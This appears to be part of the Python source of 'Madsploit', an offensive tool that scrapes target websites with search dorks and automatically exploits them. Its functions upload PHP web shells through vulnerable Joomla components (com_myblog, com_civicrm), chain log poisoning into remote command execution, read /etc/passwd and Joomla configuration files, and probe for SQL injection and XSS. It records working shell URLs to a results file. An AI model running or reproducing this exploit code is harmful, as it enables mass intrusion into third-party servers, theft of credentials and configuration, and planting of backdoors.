                        f.write(SQLI + '\n')
                if "mysql_num_rows()" in Checksqli.text:
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
                        f.write(SQLI + '\n')
                if "WHERE" in Checksqli.text:
                    SQLI = url.replace("'", '')
                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                    filename = "Results/SQLInjection.txt"
                    with open(filename, "a+") as f:
                        f.write(SQLI + '\n')
                    
                try:
                    Username = re.findall('/home/(.*)/', str(Checksqli.text))[0]
                    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}Found Box Username {PURPLE}=> {GREEN}"+Username)
                except:
                    pass

                    
                return 

            break
        except Exception as e:
            print(e)
            return 



def detect(url):
        """
        https://github.com/anouarbensaad/vulnx/blob/91fb3700f4fa5c00dcbfb4ab25685ce988040e36/modules/detector.py#L53 

        """
        if re.search(re.compile(r'<script type=\"text/javascript\" src=\"/media/system/js/mootools.js\"></script>|/media/system/js/|com_content|Joomla!'), __getcontent__(url)):
            name = 'Joomla'
            return name
        
        elif re.search(re.compile(r'wp-content|wordpress|xmlrpc.php'), __getcontent__(url)):
            name = 'Wordpress'
            return name
        elif re.search(re.compile(r'Drupal|drupal|sites/all|drupal.org'), __getcontent__(url)):
            name = 'Drupal'
            return name

        elif re.search(re.compile(r'Prestashop|prestashop'), __getcontent__(url)):
            name = 'Prestashop'
            return name
        elif re.search(re.compile(r'route=product|OpenCart|route=common|catalog/view/theme'), __getcontent__(url)):
            name = 'Opencart'
            return name

        elif re.search(re.compile(r'Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento'), __getcontent__(url)):
            name = 'Magento'
            return name
        wow = __getcontent__(url)+"/ComplexAdmin"
        
        if "Authorized Users Only!" in wow:
            name = 'Complexx/vstress rip'
            return name
        damn = __getcontent__(url)+"/panel/ComplexAdmin"

        if "Authorized Users Only!" in damn:
            name = 'Complexx/vstress rip'
            return name
        else:
            name = f'{RED}Unknown'
            return name


def __getcontent__(url):
        #print("HELLO")
        return requests.get(url, headers=HEADERS,verify=False, timeout=timeout).text
        #print("DONE")
        #return var



def auto(url):
    site = url
    if url == "":
        normalerrors()
        return main()
    if "http" in url:
        pass
    else:
        print(f" {PURPLE}[ {GREEN}~ {RESET} need to add https{GREEN}/{RESET}http {RESET}before the url {GREEN}~{RESET} {PURPLE}]{RESET}")
        return main()

    try:
        print(f"\n {PURPLE}[ {GREEN}~ {RESET} Looking for Serverinfo {GREEN}~{RESET} {PURPLE}]{RESET}")
        
        cms = serialize(url)
        
        mm = url.replace('https://', '').replace('http://', '').replace('https:', '').replace('http:', '').replace('/', '')
        host = dnsdump.hostsearch(mm)
        
        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {GREEN}{url} {RESET} ")
        with open('config.json') as json_file:
            data = json.load(json_file)
        
        if data['proxys'] == "yes":
            print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Loaded proxy {PURPLE}=> {YELLOW}{proxy} {RESET}")
        
        
        
        print(f" {PURPLE}[ {GREEN}? {PURPLE}]{RESET} CMS {PURPLE}=> {GREEN}", cms['name'])
        phpver(url)
        parms(site)
        
        if "Wordpress" in cms['name']:

            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting wpscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
            
            wp_version(url)
            wp_user(url)
            wp_themes(url)
            wp_plugin(url)
            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
            

            dirs2(url)
            dorkinfo(url)
            wp_dirs(url)
            
            #Exploitt(site) SQL Injection does not go well with Wordpress LOL
            print("")
            Exploit(url)
            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting vulnscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
            fileup(url)
            LFI(site)
            simple(url)
            #wp_thumbnailSlider(url) Broken
            revslidercss(url)
            eCommerce(url)
            gf(url)
            Media(url)
            Spreedsheet(url)
            wp_blaze(url)
            spritz(url)
            photog(url)
            eshop(url)
            Localize(url)
            tutor(url)
            boldgrid(url)
            autoadmin(url)
            autosuggest(url)
            lol(url)
            wp_cherry(url)
            soswaf(url)
            #admintakeover(url) Broken ) ;
            wp_jobmanager(url)
            #filename = url.replace("http://", '').replace('/', '')+".txt"
            revexploit(url)
            audioplayer(url)
            Triconsole(url)
            woocommerce(url)
        elif "Joomla" in cms['name']:
            print(f"\n {PURPLE}[ {GREEN}~ {RESET} Starting Joomla Scan! {GREEN}~{RESET} {PURPLE}]{RESET}\n")
            com_gmap(url)
            dorkinfo(url)
            Exploit(url)
            LFI(site)
            dirs2(url)
            Scriptegrator(url)
            com_cckjseblod(url)
            gf(url)
            Com_civicrm(url)
            com_Questions(url)
            com_portfolio(url)
            com_jck(url)
            Triconsole(url)
            com_alberghi(url)
            bj(url)
            com_myblog(url)
            com_s5(url)
            xss(site)

        else:
            print(f" {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
            bootme(url)
            dirs2(url)
            dorkinfo(url)
            #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
            Exploit(url)
            LFI(site)
            asistorage(url)
            gf(url)
            Exploitt(site)
            Triconsole(url)

            Jenzabar(url)
            Hrsale(url)
            xss(site)

        if "API count exceeded - Increase Quota with Membership" in host:
            pass
        else:
            print(f"\n{PURPLE} [ {GREEN}~ {RESET} Domain scan {GREEN}~{RESET} {PURPLE}]{RESET}")
            print(f"{GREEN}{host.replace(',', ' : ')}")

    except Exception as e:
        print(e)
        print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
        return


def com_myblog(url):
    shell = "shell/hatelife.gif"
    fileindex = {'fileToUpload': open(shell, 'rb')}
    Exp = url + '/index.php?option=com_myblog&task=ajaxupload'
    GoT = requests.post(Exp, files=fileindex, timeout=10)
    if 'success' or 'File exists' in str(GoT.content):
        if '/images/pwn' in str(GoT.content):
            IndeXpath = url + '/images/hatelife.gif'
        else:
            try:
                GetPAth = re.findall("source: '(.*)'", str(GoT.content))
                IndeXpath = GetPAth[0]
            except:
                IndeXpath = url + '/images/hatelife.gif'

            CheckIndex = requests.get(IndeXpath, timeout=10)
            if 'GIF89a' in str(CheckIndex.content):
                filename = "Results/shells.txt"
                with open(filename, "a+") as f:
                    f.write(IndeXpath + '\n')
                print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}com_myblog Exploit {PURPLE}=> {GREEN}Vuln{RESET} shell saved to {filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} com_myblog {PURPLE}=> {RED}Not Vuln")

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}

lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
def com_cckjseblod(url):
    test = requests.get(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php", timeout=timeout, headers=HEADERS)
    if 'JConfig' in str(test.content):
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(test.url+ '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} com_cckjseblod {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} com_cckjseblod {PURPLE}=> {RED}Not Vuln")

def com_jck(url):
    test = requests.get(url+"/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php", timeout=timeout)
    if "nodes" in test.text:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(test.url+ '?extension=menu&view=menu&parent=[SQL_HERE]' + '\n')
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{test.url}?extension=menu&view=menu&parent=[SQL_HERE] {RESET}| {YELLOW}Info {GREEN}https://www.exploit-db.com/exploits/49627")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} com_jck {PURPLE}=> {RED}Not Vuln")

def Triconsole(url):
    test = requests.get(url+'/calendar/calendar_form.php/"><h1>Vulnnr</h1>')
    test1 = requests.get(url+'/calendar_form.php/"><h1>Vulnnr</h1>')
    
    if "<h1>Vulnnr<h1>" in test.text:
        if test.status_code == 200:
            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
            with open(filename, "a+") as f:
                f.write(test.url + '\n')
            print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
        
    elif "<h1>Vulnnr<h1>" in test1.text:
        if test1.status_code == 200:
            print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
            with open(filename, "a+") as f:
                f.write(test1.url + '\n')
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} Triconsole XSS {PURPLE}=> {RED}Not Vuln")

def simple(url):
    payload = '"User-Agent": "<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
    lfi = requests.get(url+"/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00")
    if "root:x" in lfi.text:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(lfi.url+ '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} simple-fields LFi {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
        rce = requests.get(url+"/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=../../../../../logs/access_log%00&cmd=cat /etc/passwd", headers=payload)
        if "root:x" in rce.text:
            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
            with open(filename, "a+") as f:
                f.write(rce.url+ '\n')
            print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} simple-fields RCE {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
        else:
            print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} simple-fields RCE {PURPLE}=> {RED}Not Vuln")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} simple-fields LFI {PURPLE}=> {RED}Not Vuln")


def Com_civicrm(url):
    payloadshell = '"Vulnnr<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
    requests.post(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=vuln.php', data=payloadshell, headers=HEADERS, timeout=timeout)
    test = requests.get(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/vuln.php', headers=HEADERS, timeout=timeout)
    if "Vulnnr" in str(test.content):
        filename = "Results/shells.txt"
        with open(filename, "a+") as f:
            f.write(url + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/vuln.php?cmd=uname -a' + '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} com_civicrm {PURPLE}=> {GREEN}Vuln {RESET}shell saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} com_civicrm {PURPLE}=> {RED}Not Vuln")


def Scriptegrator(url):
    test = requests.get(url+"/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd", headers=HEADERS, timeout=timeout)
    if "root:x" in test.text:
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(test.text+ '\n')
        print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Scriptegrator {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} Scriptegrator {PURPLE}=> {RED}Not Vuln")

def com_Questions(url):
    test = requests.get(url+"/index.php?option=com_questions&tmpl=component&task=quazax.getusers&term=66'", timeout=timeout)
    if "mysql" in test.text:
        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}/index.php?option=com_questions&tmpl=component&task=quazax.getusers&term=66'")
        filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
        with open(filename, "a+") as f:
            f.write(test.url+ '\n')
    else:
        print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}com_questions {PURPLE}=> {RED}Not Vuln")


def normalerrors():
    print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RESET}something went {RED}wrong{RESET}, try again? {RESET}")
    return main()
    
def portcheck():
    user = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Site {PURPLE}=>{RESET} ")

    target = user

    if "http" in target:
        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Maybe instead of calling protocalls try www.google.com")
        return main()
    if target == "":
        print(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Looks like value is null, enter a site!")
        return portcheck()

    portu = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Port{PURPLE} =>{RESET} ")
    try:
        
        if portu == "":
            print("Port has to be int value")
            pass
        port = int(portu)

    except:
        normalerrors()


    portsobject = {
    21: 'FTP',
    22: 'SSH',
    23: 'Telnet',
    25: 'SMTP',
    43: 'Whois',
    53: 'DNS',
    68: 'DHCP',
    80: 'HTTP',
    110: 'POP3',
    115: 'SFTP',
    119: 'NNTP',
    123: 'NTP',
    139: 'NetBIOS',
    143: 'IMAP',
    161: 'SNMP',
    220: 'IMAP3',
    389: 'LDAP',
    443: 'SSL',
    1521: 'Oracle SQL',
    2049: 'NFS',
    3306: 'mySQL',
    5800: 'VNC',
    8080: 'HTTP',
    }
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    if port:
        try:

            result = sock.connect((target, port))
        except:
            return main()

        if result == 0:
            
            return main()
        else:
            print('{} Port is Open => {} '
                    .format(port, portsobject[port]))
            
            return main()






def domainscan():
    
    target = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {RESET}")
    target = target.replace('http://', '').replace('https://', '').replace('https:', '').replace('/', '')
    
    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}dnsdump {PURPLE}=>")
    time.sleep(3)
    print(json.dumps(dnsdump.dump(target), indent=1))
    time.sleep(3)
    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}hostsearch {PURPLE}=>")
    print(dnsdump.hostsearch(target))
    time.sleep(3)
    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}reversedns {PURPLE}=>")
    print(dnsdump.reversedns(target))
    time.sleep(3)
    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}dnslookup {PURPLE}=>")
    print(dnsdump.dnslookup(target))
    time.sleep(3)
    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}httpheaders {PURPLE}=>")
    print(dnsdump.httpheaders(target))
    dn = json.dumps(dnsdump.dump(target))
    hostserch = dnsdump.hostsearch(target)
    revdns = dnsdump.reversedns(target)
    dnslook = dnsdump.dnslookup(target)
    dnshead = dnsdump.httpheaders(target)


    filename = "Results/domainscan.txt"
    with io.open(filename, "a+", encoding="utf-8") as f:
                    #f.write(f"{GetConfig.url}\n\n") Sometimes it outputs weird shit LOL
            f.write(f"\nDOMAIN SCAN => {target}\n{dn}\n{hostserch}\n{revdns}\n{dnslook}\n{dnshead}")
    f.close()
    print(f"\n{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}domainscan results saved to {GREEN}{filename}")
    '''
    stfu
    '''


def oow(dork, count):
    requ = 0
    filename = "Results/AutoDorked.txt"
    unclean = "Results/UncleanAutoDorked.txt"
    counter = 0
    f = open(filename, "a+")
    u = open(unclean, "a+")
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5)\
            AppleWebKit/537.36 (KHTML, like Gecko) Cafari/537.36'}

    
    for results in search(dork, tld="com", lang="en", num=int(count), start=0, stop=None, pause=2):
        counter = counter + 1
        
        print (f" {PURPLE}[ {GREEN}$ {PURPLE}]{RESET}", counter, results.split('/')[2])
        
        time.sleep(0.3)
        requ += 1
        if requ >= int(count):
            break
        data = (counter, results)
        f.write("http://"+results.split('/')[2] + "/" + '\n')
        u.write("http://"+results)
    
    
    f.close()
    u.close()
    print(f"{PURPLE} [ {GREEN}$ {PURPLE}] {RESET}saved results to {GREEN}{filename}")
        
def uu(dork):
    cnn = requests.get("https://www.bing.com/search?q={dork}")
    
    finder = re.findall('<h2><a href="((?:https://|http://)[a-zA-Z0-9-_]+\\.*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11})', str(cnn.text))
    print(finder)
    #for u in finder:
        #print(u)
        
def autodork():
        print(f"{PURPLE} [ {GREEN}% {PURPLE}] {YELLOW} edit dorks.txt for dork list ")
        print(f"{PURPLE} [ {GREEN}% {PURPLE}] {YELLOW} Sadly this is kind of broken maybe i need to add new search methods? ")
        file_name = "dorks.txt"
        with open(file_name, 'r') as f:
            buf = f.readlines()
            if buf[-1] == '\n':
                buf = buf[:-1]
            urls = [x[:-1] for x in buf]
            for dork in urls:
                try:
                    print(f"\n{PURPLE} [ {GREEN}* {PURPLE}] {RESET}Using Dork {PURPLE}=> {GREEN}"+dork)
                    oow(dork, "500")
                    #uu(dork)
                    time.sleep(16)
                    print(f"\n{PURPLE} [ {GREEN}* {PURPLE}] {RESET}Done")
                except Exception as e:
                    print(f"{PURPLE} [ {GREEN}! {PURPLE}] {RED}{e}")
                    time.sleep(30)
                    pass


def xhelp():
    print("")
    print(f"""
 {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}webvulns:\n
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}mailman {PURPLE}=> {RESET}Cloudssp exploit
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}vulnscan {PURPLE}=> {RESET}Vuln Scanner/exploiter single target
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}vulnauto {PURPLE}=> {RESET}Vuln Scanner/exploiter list
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}autodorker {PURPLE}=> {RESET}Auto dorker Scanner/exploiter from a list of dorks
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wpversion {PURPLE}=> {RESET}Wordpress Version Scanner
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wpthemes {PURPLE}=> {RESET}Wordpress Theme Scanner
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}wpplugins {PURPLE}=> {RESET}Wordpress Plugins Scanner
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}sql {PURPLE}=> {RESET}Sql injection Scanner
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}dorker {PURPLE}=> {RESET}Auto dorker Scanner/exploiter
    
    
 {PURPLE}[ {GREEN}~ {PURPLE}] {RESET}others:\n
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}port {PURPLE}=> {RESET}Port Checker
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}domainscan {PURPLE}=> {RESET}Domain Scanner
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}dirscan {PURPLE}=> {RESET}Dirs Scanner
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}shellcheck {PURPLE}=> {RESET}Checks if shells are working
    {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}portscanner {PURPLE}=> {RESET}Port Scanner
    """)
    return main()

def main():
    

    host_name = socket.gethostname()
    user = getpass.getuser()
    ## Just cool theme shit

    try:
        dirpath = os.getcwd()
        foldername = os.path.basename(dirpath)
        userinput = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Input {PURPLE}=>{PURPLE} {PURPLE}{RESET}")
        #userinput = input(f"{RESET}{user}{YELLOW}@{CYAN}{host_name}:{RED}~{CYAN}/{foldername}{RED}$ {RESET}")
        #tmp = sp.call('clear', shell=True)
    except (KeyboardInterrupt, SystemExit):
        print(f"\n{c}Leaving {Y}Madsploit... {w}")

        sys.exit()
        raise
    if userinput == "port":
        portcheck()
    if userinput == "xhelp":
        xhelp()
    if userinput == "portscanner":
        scanner()
    if userinput == "autodorker":
        autodork()
    if userinput == "dorker":
        dork = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Dork {PURPLE}=> {RESET}")
        try:
            count = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}ScrapeCount {PURPLE}=> {RESET}")
        except:
            return

        
        dorker(dork, count)
        file_name = "Results/Dorked.txt"
        with open(file_name, 'r') as f:
            buf = f.readlines()
            if buf[-1] == '\n':
                buf = buf[:-1]
            urls = [x[:-1] for x in buf]
            for url in urls:
                auto(url)
    elif userinput == "help":
        xhelp()
    
        
    elif userinput == "domainscan":
        domainscan()
    elif userinput == "mailman":
        mailman()
    elif userinput == "sql":
        site = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {RESET}")
        Exploitt(site)
    elif userinput == "wpversion":
        url = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {RESET}")
        wp_version(url)
        return main()
    elif userinput == "wpplugins":
        url = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Target {PURPLE}=> {RESET}")
        wp_plugin(url)
        return main()
    elif userinput == "shellcheck":
        os.system("python3 shellchecker.py")
    elif userinput == "dirscan":
        dirscan()
    elif userinput == "wpthemes":
        url = input(f"{PURPLE} [ {GREEN}? {PURPLE}] {RESET}Site {PURPLE}=> {RESET}")
        wp_themes(url)
        return main()

    elif userinput == "vulnauto":
        print(f" \n {PURPLE}[ {GREEN}${PURPLE} ] {RESET}Vuln Scanner/Exploiter")
        file_name = input(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}Targets {PURPLE}=>{RESET} ")
        try:
            
            with open(file_name, 'r') as f:
                buf = f.readlines()
                if buf[-1] == '\n':
                    buf = buf[:-1]
                urls = [x[:-1] for x in buf]
                for url in urls:
                    auto(url)
                    print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Done!")
        except Exception as e:
            print(e)
            print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}Could not open {RED}{file_name}!\n")
            return main()
        
    elif userinput == "vulnscan":
        print(f"\n {PURPLE}[ {GREEN}~ {RESET}Vuln Scanner/exploiter  {GREEN}~ {PURPLE}] {RESET}\n")
        url = input(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Target{PURPLE} => {RESET}")
        init_time = time.time()
        
        auto(url)
        end_time = time.time()
        elapsed_time = end_time - init_time
        print(f"\n {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Elapsed Time {PURPLE}=>{RESET}"+' %.2f seconds ' % (elapsed_time)+"\n")
        return main()

    if userinput == "cls":
        
        os.system("cls;clear")
        banner()
        return main()

    try:
        pass
        #os.system(f"{userinput}")
    except (KeyboardInterrupt, SystemExit):
        print("EXIT")  
    except Exception as e:
        print(e)
        return main()
    return main()
main()